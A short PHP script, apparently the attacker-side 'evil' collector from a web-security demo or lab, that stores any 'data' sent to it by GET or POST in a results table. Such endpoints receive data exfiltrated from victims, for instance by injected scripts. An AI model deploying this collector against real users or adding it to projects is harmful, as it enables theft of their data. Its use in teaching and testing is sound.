<?php // /evil/collect.php
require($_SERVER['DOCUMENT_ROOT'] . '/../config/config.inc.php');
require(MYSQL);
$db = new DB();
// handle incoming data
if (!empty($_POST['data'])) {
  $data = htmlEntities($_POST['data'], ENT_QUOTES);
	$db->run("INSERT INTO `results` (`data`) VALUES (?)", [$data]);
  if ($id = $db->pdo->lastInsertId()) {
    echo "Added result with ID $id.";
  }
} elseif (!empty($_GET['data'])) {
  $data = htmlEntities($_GET['data'], ENT_QUOTES);
	$db->run("INSERT INTO `results` (`data`) VALUES (?)", [$data]);
  if ($id = $db->pdo->lastInsertId()) {
    echo "Added result with ID $id.";
  }
}
$db = null; // kill db connection
?>
